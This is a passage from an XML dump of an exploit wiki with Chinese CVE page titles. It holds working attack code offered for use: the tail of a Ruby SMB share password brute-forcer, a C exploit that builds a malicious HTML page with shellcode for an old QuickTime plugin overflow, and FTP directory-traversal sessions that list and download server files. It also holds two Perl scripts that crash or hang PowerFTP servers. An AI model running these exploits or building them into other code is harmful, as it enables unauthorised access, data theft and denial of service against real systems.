  rescue IOError, SocketError, SystemCallError =&gt; e
    puts e.message
    puts e.backtrace.inspect
    exit(-1)
  end
}


#Start brute-forcing the password
shares.each { |share|
  next_share = FALSE
  share = share.delete("\000")
  #puts  share.length

  nbs_length = 0x33 + share.length
  length0 = 0x01
  length1 = 0x00
  byte_count0 = 0x08 + share.length
  byte_count1 = 0x00
  password = [0x20]   #TODO skip lowercase letters

  puts "Brute-forcing password for share: " + share

  while true
    begin

      packet = update_password(tree_connect_request_path_password,nbs_length, length0, length1,
                               byte_count0, byte_count1,password,share)
      debug_puts "Packet updated"
      response = send_and_receive(socket,packet)

      if ((response.first[9].unpack('C') +
          response.first[10].unpack('C') +
          response.first[11].unpack('C') +
          response.first[12].unpack('C'))[0] == 0) then

        debug_puts 'Auth success, trying next char'

        if (password[0] ==0x20 and password[1]==0x20)
          puts "Empty password works!\n\n"
          next_share=TRUE
          break
        end

        length0 = length0 + 1
        nbs_length = nbs_length + 1
        byte_count0 = byte_count0 + 1

        password.push(0x20)

        tid = response.first[28..29]
        debug_puts "New tree ID TID !"
        debug_hex_dump(hex,tid)


        packet = update_tid(tree_disconnect, tid)
        response = send_and_receive(socket,tree_disconnect)

      else
        password[length0-1] = password[length0-1] + 1

        password.each { |val|
          print val.chr()

        }
        print "\r"

        sleep(delay)

        if (password[length0-1] &gt; 128)  then
          password.each { |val|
            if (val &lt; 128) then
              print val.chr()
            end
          }

          #TODO check for 0 length password
          if length0 &gt; 1
            puts "\n"+'&lt;- No more char to try, this should be your password, yikes :) '+"\n\n"
          else
            puts "Password not found :("+"\n\n"
          end

          next_share=TRUE
        end
      end

    rescue IOError, SocketError, SystemCallError =&gt; e
      puts e.message
      puts e.backtrace.inspect
      exit(-1)
    end

    if (next_share)   #moving on to the next share
      break
    end
  end

}

sock_close(socket)

&lt;/pre&gt;</text>
      <sha1>il2uh23r71op4hfos38qzn4dfujtagd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-0198 Apple Quicktime plugin - Windows 4.1.2 (Japanese) 遠程溢出漏洞</title>
    <ns>0</ns>
    <id>2779</id>
    <revision>
      <id>3280</id>
      <timestamp>2021-05-26T01:05:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #include    &lt;stdio.h&gt; #include    &lt;stdlib.h&gt; #include    &lt;windows.h&gt;  #define MOV_FILE    "c:\\program files\\quicktime\\sample.mov" #define HEIGHT      60 #defi..."</comment>
      <origin>3280</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2180" sha1="pvapq3gvvei2dgxurbg4961kgfmptuy" xml:space="preserve">==EXP==
&lt;pre&gt;
#include    &lt;stdio.h&gt;
#include    &lt;stdlib.h&gt;
#include    &lt;windows.h&gt;

#define MOV_FILE    "c:\\program files\\quicktime\\sample.mov"
#define HEIGHT      60
#define WIDTH       60
#define TARGET      "QUICKTIMEPLAYER"
#define FILE_IMAGE  \
                    "&lt;html&gt;&lt;embed src=\"%s\" href=\"%s\" "\
                    "width=%d height=%d autoplay=\"true\" "\
                    "target=\"%s\"&gt;&lt;br&gt;&lt;/html&gt;"
#define BUFSIZE     730
#define RET         684
#define ESP_TGT     "rpcrt4.dll"
#define JMPESP_1    0xff
#define JMPESP_2    0xe4
#define NOP         0x90

unsigned char   exploit_code[200]={
        0x33,0xC0,0x40,0x40,0x40,0x40,0x40,0x50,
        0x50,0x90,0xB8,0x2D,0x23,0xF5,0xBF,0x48,
        0xFF,0xD0,0x00,
};

main(int argc,char *argv[])
{
    FILE            *fp;
    char            buf[BUFSIZE];
    unsigned int    i,pretadr,p,ip,kp;
    MEMORY_BASIC_INFORMATION meminfo;

    if (argc&lt;2){
        printf("usage : %s Output_HTML-fileName [Sample .mov file]\n",
               argv[0]);
        exit(1);
    }

    if ((void *)(kp=(unsigned int)LoadLibrary(ESP_TGT))==NULL){
         printf("%s is not found.\n",ESP_TGT);
         exit(1);
    }

    VirtualQuery((void *)kp,&amp;meminfo,sizeof(MEMORY_BASIC_INFORMATION));
    pretadr=0;
    for (i=0;i&lt;meminfo.RegionSize;i++){
        p=kp+i;
        if (  ( p     &amp;0xff)==0
           || ((p&gt;&gt;8 )&amp;0xff)==0
           || ((p&gt;&gt;16)&amp;0xff)==0
           || ((p&gt;&gt;24)&amp;0xff)==0) continue;
        if (   *((unsigned char *)p)==JMPESP_1
            &amp;&amp; *(((unsigned char *)p)+1)==JMPESP_2)
            pretadr=p;
    }
    if ((fp=fopen(argv[1],"wb"))==NULL){
        printf("File write error \"%s\"\n",argv[1]);
        exit(1);
    }
    memset(buf,NOP,BUFSIZE);
    memcpy(buf+700-12,exploit_code,strlen(exploit_code));
    buf[BUFSIZE-2]=0;

    ip=pretadr;
    printf("EIP=%x\n",ip);
    buf[RET  ]=ip&amp;0xff;
    buf[RET+1]=(ip&gt;&gt;8)&amp;0xff;
    buf[RET+2]=(ip&gt;&gt;16)&amp;0xff;
    buf[RET+3]=(ip&gt;&gt;24)&amp;0xff;

    if (argc==2)
        fprintf(fp,FILE_IMAGE,MOV_FILE,buf,WIDTH,HEIGHT,TARGET);
    else
        fprintf(fp,FILE_IMAGE,argv[2],buf,WIDTH,HEIGHT,TARGET);
    fclose(fp);
    printf("Done.\n");
 }


&lt;/pre&gt;</text>
      <sha1>pvapq3gvvei2dgxurbg4961kgfmptuy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-0680 Web目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>575</id>
    <revision>
      <id>789</id>
      <timestamp>2021-03-31T06:30:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt;   ======================================================================  	      QVT/NET 4.3 FTP server Directory Traversal   Author: alt3kx! &lt;alt3kx@raza-mexic..."</comment>
      <origin>789</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3018" sha1="hicg9jn3b8w7mk5trti2h3tc2ag1ev5" xml:space="preserve">==INFO==
&lt;pre&gt;


======================================================================

	      QVT/NET 4.3 FTP server Directory Traversal


Author: alt3kx! &lt;alt3kx@raza-mexicana.org&gt;
Date: 2001-05-22
Site: www.raza-mexicana.org

Greet to: _0x90_, dr_fdisk^, Dex, PaTa
Teams: Raregazz - X-ploit and S0d

vicente F0x no rulas wey!
======================================================================
------------------------=[Brief Description]=-------------------------

QVT/NET FTP Server is an FTP server for Windows 9x/NT/2000.
A bug  allows  any user to change to any directory and see files to PATH
also GET files remotely.

----------------------------=[Plataforms]=-------------------------------

Windows 9.x
Windows NT
windows 2000


-----------------------------=[Summary]=---------------------------------


When sending the command "CWD ..." (or "cd ..." in the default FTP
client), the server will go one directory up.



EXploit:


C:\&gt;ftp server.vulnerable.com
Connected to server.vulnerable.com.
220 shell FTP server (QVT/Net 4.3) ready.
User (server.vulnerable.com:(none)): anonymous
331 Guest login OK, please send real ident as password.
Password:
230 Guest login OK, access restrictions apply.
ftp&gt; cd ..
501 CWD command not allowed.

SO THE BUG... ...

ftp&gt;cd .../.../.../.../.../.../
250 CWD command successful.
ftp&gt; dir
200 PORT command successful.
150 Opened data connection for 'ls' (server.vulnerable.com,1105) (0 bytes).
-rwxrwxrwx 1 nobody system       246928  Jan 18 13:10 nc.exe
drwxrwxrwx 1 nobody system            0  Jan 18 15:39 Netscape 6
drwxrwxrwx 1 nobody system            0  Jan 18 14:50 Netscape 6 Setup
-rwxrwxrwx 1 nobody system      3209110  Jan 19 10:51 icq.exe
-rwxrwxrwx 1 nobody system      6330449  Jan 19 12:01 porn.exe
drwxrwxrwx 1 nobody system            0  Jan 18 17:44 norton
drwxrwxrwx 1 nobody system            0  Jan 19 11:14 Program Files
drwxrwxrwx 1 nobody system            0  Jan 19 12:04 plugins

.
.
.
.

-rwxrwxrwx 1 nobody system            0  May  4 13:05 hacksites.txt
drwxrwxrwx 1 nobody system            0  May  4 16:51 XXXX
drwxrwxrwx 1 nobody system            0  May  8 13:17 teens
drwxrwxrwx 1 nobody system            0  May  8 13:18 tmp
-rwxrwxrwx 1 nobody system          168  May 21 19:07 raza-alt3kx.txt
226 Transfer complete.
ftp: 7707 bytes received in 0.35Seconds 21.96Kbytes/sec.

ftp&gt; get raza-alt3kx.txt
200 PORT command successful.
150 ASCII data connection for raza-alt3kx.txt (server.vulnerable.com,1106) 
(168 bytes).
226 Transfer complete.
ftp: 168 bytes received in 0.02Seconds 8.40Kbytes/sec.
ftp&gt;quit
221 Goodbye.



C:\&gt;type raza-alt3kx.txt

Bug discovered by alt3kx! &lt;alt3kx@raza-mexicana.org&gt;


C:\&gt;


-------------------------------=[Patch]=---------------------------------

The recomended action is to changue the persmissions or define
individual directory for users anonymous with files no compromise.

-------------------------=[Company Compromise]=--------------------------

Company:

http//www.qpc.com
&lt;/pre&gt;</text>
      <sha1>hicg9jn3b8w7mk5trti2h3tc2ag1ev5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-0758 Shambala 4.5目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>576</id>
    <revision>
      <id>790</id>
      <timestamp>2021-03-31T06:32:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; alt3kx@machine:/tmp$ ftp 1.xx.xx.xx Connected to 1.xx.xx.xx. 220 1.xx.xx.xx - Shambala FTP Server Ready. Name (1.xx.xx.xx:Administrator): anonymous 331 Password..."</comment>
      <origin>790</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4670" sha1="7ezue4wa77d2t6ut0qvpc93svrq7gvi" xml:space="preserve">==EXP==
&lt;pre&gt;
alt3kx@machine:/tmp$ ftp 1.xx.xx.xx
Connected to 1.xx.xx.xx.
220 1.xx.xx.xx - Shambala FTP Server Ready.
Name (1.xx.xx.xx:Administrator): anonymous
331 Password required for anonymous.
Password:
230 User anonymous logged in.
ftp&gt; cd ..
550 Requested action not taken. Permission denied.
ftp&gt; pwd
257 "/" is current directory.
ftp&gt; dir
200 PORT command successful.
150 Opening data connection.
  d---------    owner    group          0   21-maj-01 17:50   1.xx.xx.xx
  ----------    owner    group        283   21-maj-01 17:55   
index-_-1_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-2_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-3_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-4_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-5_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-6_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-7_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-8_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-9_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-10_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-11_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-12_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-13_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-14_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-15_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_-16_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_0_0_0.htm
  ----------    owner    group        283   21-maj-01 17:55   
index-_0_0_-1.htm
  ----------    owner    group        283   21-maj-01 17:55   .htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-2.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-3.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-4.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-5.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-6.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-7.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-8.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-9.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-10.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-11.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_0_-12.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_0_-1_-11.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_1_0_-11.htm
  ----------    owner    group        283   21-maj-01 18:08   
index-_-1_0_-11.htm

226 Transfer complete
ftp&gt; cd ../
550 Requested action not taken. Permission denied.
ftp&gt;

EXPLOIT... ...

ftp&gt; cd /.../.../
257 CWD command successful.
ftp&gt; dir
200 PORT command successful.
150 Opening data connection.
  ----------    owner    group      15444   04-maj-01 14:26   SCAN.log
  ----------    owner    group     140340   04-maj-01 14:05   
MAILS-PRESIDENCIA.txt
  ----------    owner    group     466944   18-sep-99 09:32   Shambala.exe
  ----------    owner    group       3564   21-maj-01 17:48   ST6UNST.LOG
  ----------    owner    group         31   21-maj-01 17:50   
passwordsxxx.txt
  d---------    owner    group          0   21-maj-01 17:50   Web
226 Transfer complete.
ftp&gt;


ftp&gt; cd /.../.../.../.../
257 CWD command successful.
ftp&gt; dir
200 PORT command successful.
150 Opening data connection.
  ----------    owner    group     246928   18-jan-01 13:10   N6Setup.exe
  d---------    owner    group          0   18-jan-01 15:39   Netscape 6
  d---------    owner    group          0   18-jan-01 14:50   Netscape 6 
Setup
  ----------    owner    group    3209110   19-jan-01 10:51   getrgt.exe

.
.
.
.
.

  ----------    owner    group        168   21-maj-01 19:07   
raza-alt3kx.txt

ftp&gt; get raza-alt3kx.txt
200 PORT command successful.
150 Opening data connection.
226 Transfer complete.
168 bytes received in 0 seconds (168 bytes/s)
ftp&gt; quit
221 Goodbye.


alt3kx@machine:/tmp$ cat raza-alt3kx.txt


Bug discovered by alt3kx! &lt;alt3kx@raza-mexicana.org&gt;


alt3kx@machine:/tmp$
&lt;/pre&gt;</text>
      <sha1>7ezue4wa77d2t6ut0qvpc93svrq7gvi</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-0758 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>577</id>
    <revision>
      <id>791</id>
      <timestamp>2021-03-31T06:34:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo------ PowerFTP Server data revealing sensitive on DRIVES remotes and Denial of Service Vulnerability (Released exploits Codes). ------oOo------  Power..."</comment>
      <origin>791</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2777" sha1="muxcbv7o9gdc7unswhi05mmau5ivtex" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo------
PowerFTP Server data revealing sensitive on DRIVES remotes
and Denial of Service Vulnerability (Released exploits Codes).
------oOo------

PowerFTPServer for Windows 9x/NT/2000 contains remote vulnerabilities 
which allow users to see and retrieve any file on the server. 
Exploit information included.

Company Affected: www.CooolSoft.com
Version: v2.03
Date Added: 08-28-01
Size: 1.83 MB
OS Affected: Windows 95/98/NT/2000

Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins 
** G.Maggiotti &amp; H.Oliveira.

----=[Brief Description]=------------

PowerFTP Server is an FTP server for Windows 9x/NT/2000.
A bug  allows  any user to change to any directory and see 
files to PATH also GET files remotely.

----=[Summary]=----------------------

PowerFTP is a powerful FTP client/server software. The feature of 
PowerFTP is the function of multiple thread downloading and uploading. 
it can even split one big file into several parts, and it can make 
your computer as a standard FTP server but exist a big HOLES:

1) Reveling data sensitive REMOTE with account restricted on Drives
   CDROM. Floppy and HDD Proof of concept.
2) Exploit code data revealing (Remote).
3) Remote DoS proof of concept.
4) Exploit code DoS (Remote).
5) Exploit code DoS attack Floppy Drive (Remote).

------oOo------
Proof of concept

# uname -a
SunOS Lab 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
#

# ftp 10.0.0.1
Connected to 10.0.0.1.
220 Personal FTP Server ready
Name (10.0.0.1:root): temp
331 Password required for temp.
Password:
230 User temp logged in.
ftp&gt;
ftp&gt; pwd
257 "C:/WINDOWS/Application Data/Microsoft/Internet Explorer/Quick 
Launch/Mis documentos/tools/" is current directory.

ftp&gt; cd .../.../
501 CWD failed. Cannot accept relative path using dot notation
ftp&gt;

------oOo------
(1) Reveling Data C:\ Drive, floppy A:\ and CDROM, if u run something,
in this case exist a CD installation ENCARTA 2001 in Spanish u
can see all the files.
------oOo------

ftp&gt; ls ../../../../../../../
200 Port command successful.
150 Opening data connection for directory list.
SUHDLOG.DAT
COMMAND.COM
BOOTLOG.PRV
FRUNLOG.TXT
DOS
AUTOEXEC.DOS
CONFIG.DOS
VIDEOROM.BIN
CONFIG.SYS
DBLSPACE.BIN
MSDOS.SYS
MSDOS.---
SETUPLOG.TXT
WINDOWS
test.txt.txt
#
226 File sent ok
remote: ../../../../../../../
561 bytes received in 0.12 seconds (4.61 Kbytes/s)
ftp&gt;

------oOo------------------------------------
Vendor Response:
The vendor was notified
Support@cooolsoft.com
http://www.cooolsoft.com
Patch Temporary: Restricted files and Directories.

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2001.

------oOo------------------------------------

&lt;/pre&gt;</text>
      <sha1>muxcbv7o9gdc7unswhi05mmau5ivtex</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-0932 Cooolsoft PowerFTP拒絕服務漏洞</title>
    <ns>0</ns>
    <id>578</id>
    <revision>
      <id>792</id>
      <timestamp>2021-03-31T06:35:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO1== &lt;pre&gt; source: http://www.securityfocus.com/bid/3595/info   PowerFTP is a commercial FTP server for Microsoft Windows 9x/ME/NT/2000/XP operating systems. It is mainta..."</comment>
      <origin>792</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4327" sha1="g7y3s0wr55p3ui9ka7extbqciuiu8ra" xml:space="preserve">==INFO1==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/3595/info


PowerFTP is a commercial FTP server for Microsoft Windows 9x/ME/NT/2000/XP operating systems. It is maintained by Cooolsoft.

Multiple instances of denial of service vulnerabilities exist in PowerFTP's FTP daemon. This is achieved by connecting to a vulnerable host and submitting an unusally long string of arbitrary characters.

It has been reported that this issue may also be triggered by issuing an excessively long FTP command of 2050 bytes or more.

This issue may is most likely due to a buffer overflow. If this is the case, there is a possibility that arbitrary code may be executed on the vulnerable host. However, this has not yet been confirmed. 

#!/usr/bin/perl
# Simple script to send a long 'A^s' command to the server, 
# resulting in the ftpd crashing
#
# PowerFTP Server v2.03 proof-of-concept exploit
# By Alex Hernandez &lt;al3x.hernandez@ureach.com&gt; (C)2001.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti &amp; H.Oliveira.
# 
#
# Usage: perl -x PowerFTP_Dos.pl -s &lt;server&gt;
#
# Example: 
#
# perl -x PowerFTP_Dos.pl -s 10.0.0.1
# 220 Personal FTP Server ready
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nPowerFTP server v2.03 DoS exploit (c)2001\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&amp;usage;}
$serv = $args{s};
$foo = "A"; $number = 2048; 
$data .= $foo x $number; $EOL="\015\012";

$remote = IO::Socket::INET-&gt;new(
                    Proto =&gt; "tcp",
                    PeerAddr =&gt; $args{s},
                    PeerPort =&gt; "ftp(21)",
                ) || die("Unable to connect to ftp port at $args{s}\n");

$remote-&gt;autoflush(1);
print $remote "$data". $EOL;
while (&lt;$remote&gt;){ print }
print("\nCrash was successful !\n");


sub usage {die("\nUsage: $0 -s &lt;server&gt;\n\n");}
&lt;/pre&gt;

==INFO2==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/3595/info
 
 
PowerFTP is a commercial FTP server for Microsoft Windows 9x/ME/NT/2000/XP operating systems. It is maintained by Cooolsoft.
 
Multiple instances of denial of service vulnerabilities exist in PowerFTP's FTP daemon. This is achieved by connecting to a vulnerable host and submitting an unusally long string of arbitrary characters.
 
It has been reported that this issue may also be triggered by issuing an excessively long FTP command of 2050 bytes or more.
 
This issue may is most likely due to a buffer overflow. If this is the case, there is a possibility that arbitrary code may be executed on the vulnerable host. However, this has not yet been confirmed. 

#!/usr/bin/perl
#
# Even though the server will deny access, the slow hardware 
# will still hang the machine. This program attempts to 
# exploit this weakness by sending the 'NLST a:/' command to 
# the server 
#
# PowerFTP Server v2.03 proof-of-concept exploit
# By Alex Hernandez &lt;al3x.hernandez@ureach.com&gt; (C)2001.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins,
# G.Maggiotti &amp; H.Oliveira.
# 
#
# Usage: perl -x PowerFTP_floppy.pl &lt;server&gt; &lt;port&gt; &lt;user&gt; &lt;pass&gt;
#
# Example: 
#
# perl -x PowerFTP_floppy.pl 10.0.0.1 21 temp temp
# 

use IO::Socket;

print("\nPowerFTP server v2.03 DoS exploit Floppy (c)2001\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

#$NUMBER_TO_SEND = 3000; 
$BUFF = 3000; 

if ( scalar @ARGV &lt; 4 ) {
    print "Usage: $0 &lt;server&gt; &lt;port&gt; &lt;user&gt; &lt;pass&gt;\n";
    exit();
}


$target = $ARGV[ 0 ];
$port = $ARGV[ 1 ];
$username = $ARGV[ 2 ];
$password = $ARGV[ 3 ];

print "Creating socket... ";
$sock = new IO::Socket::INET( PeerAddr =&gt; $target,
                              PeerPort =&gt; int( $port ), 
                                Proto =&gt; 'tcp' );
die "$!" unless $sock;
print "done.\n";


read( $sock, $buffer, 1 );


print "Sending username...";
print $sock "USER " . $username . "\n";
read( $sock, $buffer, 1 );
print "done.\n";


print "Sending password...";
print $sock "PASS " . $password . "\n";
read( $sock, $buffer, 1 );
print "done.\n";


print "DoS Attack floppy server...";
for( $i = 0; $i &lt; $BUFF; $i++ ) {

    print $sock "NLST a:/\n";   
    read( $sock, $buffer, 1 );
}

print "done.\n";

close( $sock );
exit();
&lt;/pre&gt;</text>
      <sha1>g7y3s0wr55p3ui9ka7extbqciuiu8ra</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-0933 Cooolsoft PowerFTP Server 2.03目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>579</id>
    <revision>
      <id>793</id>
      <timestamp>2021-03-31T06:40:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo------ PowerFTP Server data revealing sensitive on DRIVES remotes and Denial of Service Vulnerability (Released exploits Codes). ------oOo------  Power..."</comment>
      <origin>793</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2779" sha1="59tzbfi7it4r5s1tc758da5naou16lp" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo------
PowerFTP Server data revealing sensitive on DRIVES remotes
and Denial of Service Vulnerability (Released exploits Codes).
------oOo------

PowerFTPServer for Windows 9x/NT/2000 contains remote vulnerabilities 
which allow users to see and retrieve any file on the server. 
Exploit information included.

Company Affected: www.CooolSoft.com
Version: v2.03
Date Added: 08-28-01
Size: 1.83 MB
OS Affected: Windows 95/98/NT/2000

Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins 
** G.Maggiotti &amp; H.Oliveira.

----=[Brief Description]=------------

PowerFTP Server is an FTP server for Windows 9x/NT/2000.
A bug  allows  any user to change to any directory and see 
files to PATH also GET files remotely.

----=[Summary]=----------------------

PowerFTP is a powerful FTP client/server software. The feature of 
PowerFTP is the function of multiple thread downloading and uploading. 
it can even split one big file into several parts, and it can make 
your computer as a standard FTP server but exist a big HOLES:

1) Reveling data sensitive REMOTE with account restricted on Drives
   CDROM. Floppy and HDD Proof of concept.
2) Exploit code data revealing (Remote).
3) Remote DoS proof of concept.
4) Exploit code DoS (Remote).
5) Exploit code DoS attack Floppy Drive (Remote).

------oOo------
Proof of concept

# uname -a
SunOS Lab 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
#

# ftp 10.0.0.1
Connected to 10.0.0.1.
220 Personal FTP Server ready
Name (10.0.0.1:root): temp
331 Password required for temp.
Password:
230 User temp logged in.
ftp&gt;
------oOo------
Exist another method for view "c:\" drive type the next:
------oOo------

ftp&gt; ls c:/
200 Port command successful.
150 Opening data connection for directory list. 
SUHDLOG.DAT
COMMAND.COM
BOOTLOG.PRV
FRUNLOG.TXT
DOS
[...]

------oOo------
For list the files CDROM drive type the next:
------oOo------

ftp&gt; ls d:/
200 Port command successful.
150 Opening data connection for directory list.
00000001.LT1
AREF
AUTORUN.EXE
AUTORUN.INF
AUTORUN.INI
CLCD16.DLL
CLCD32.DLL
CLUF.TXT
D6F04BA8.BIN
DPLAYERX.DLL
DRVMGT.DLL
EE
EEAUTO.ICO
[...]

------oOo------
For list the files Floppy drive type the next:
------oOo------
ftp&gt; ls a:/
200 Port command successful.
150 Opening data connection for directory list.

NOTE: If not exist Diskket, u can listen how to run the Drive :-).


------oOo------------------------------------
Vendor Response:
The vendor was notified
Support@cooolsoft.com
http://www.cooolsoft.com
Patch Temporary: Restricted files and Directories.

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2001.

------oOo------------------------------------

&lt;/pre&gt;</text>
      <sha1>59tzbfi7it4r5s1tc758da5naou16lp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-0934 Cooolsoft PowerFTP Server 2.03目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>580</id>
    <revision>
      <id>794</id>
      <timestamp>2021-03-31T06:41:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo------ PowerFTP Server data revealing sensitive on DRIVES remotes and Denial of Service Vulnerability (Released exploits Codes). ------oOo------  Power..."</comment>
      <origin>794</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2398" sha1="qsh0fb4tpvvs0al64twur1xcir8hgx1" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo------
PowerFTP Server data revealing sensitive on DRIVES remotes
and Denial of Service Vulnerability (Released exploits Codes).
------oOo------

PowerFTPServer for Windows 9x/NT/2000 contains remote vulnerabilities 
which allow users to see and retrieve any file on the server. 
Exploit information included.

Company Affected: www.CooolSoft.com
Version: v2.03
Date Added: 08-28-01
Size: 1.83 MB
OS Affected: Windows 95/98/NT/2000

Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins 
** G.Maggiotti &amp; H.Oliveira.

----=[Brief Description]=------------

PowerFTP Server is an FTP server for Windows 9x/NT/2000.
A bug  allows  any user to change to any directory and see 
files to PATH also GET files remotely.

----=[Summary]=----------------------

PowerFTP is a powerful FTP client/server software. The feature of 
PowerFTP is the function of multiple thread downloading and uploading. 
it can even split one big file into several parts, and it can make 
your computer as a standard FTP server but exist a big HOLES:

1) Reveling data sensitive REMOTE with account restricted on Drives
   CDROM. Floppy and HDD Proof of concept.
2) Exploit code data revealing (Remote).
3) Remote DoS proof of concept.
4) Exploit code DoS (Remote).
5) Exploit code DoS attack Floppy Drive (Remote).

------oOo------
Proof of concept

# uname -a
SunOS Lab 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
#

# ftp 10.0.0.1
Connected to 10.0.0.1.
220 Personal FTP Server ready
Name (10.0.0.1:root): temp
331 Password required for temp.
Password:
230 User temp logged in.
ftp&gt;

------oOo------
Proof of concept

# uname -a
SunOS Lab 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
#

# ftp 10.0.0.1
Connected to 10.0.0.1.
220 Personal FTP Server ready
Name (10.0.0.1:root): temp
331 Password required for temp.
Password:
230 User temp logged in.
ftp&gt;
ftp&gt; pwd
257 "C:/WINDOWS/Application Data/Microsoft/Internet Explorer/Quick 
Launch/Mis documentos/tools/" is current directory.


------oOo------------------------------------
Vendor Response:
The vendor was notified
Support@cooolsoft.com
http://www.cooolsoft.com
Patch Temporary: Restricted files and Directories.

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2001.

------oOo------------------------------------

&lt;/pre&gt;</text>
      <sha1>qsh0fb4tpvvs0al64twur1xcir8hgx1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2001-1442 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>581</id>
    <revision>
      <id>795</id>
      <timestamp>2021-03-31T06:44:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ======================================================================                  Defcom Labs Advisory def-2001-19                  innfeed buffer overflo..."</comment>
      <origin>795</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6647" sha1="d0evsmi3fkohc9pf93yfilym4mo9wx6" xml:space="preserve">==INFO==
&lt;pre&gt;
======================================================================
                 Defcom Labs Advisory def-2001-19

                innfeed buffer overflow

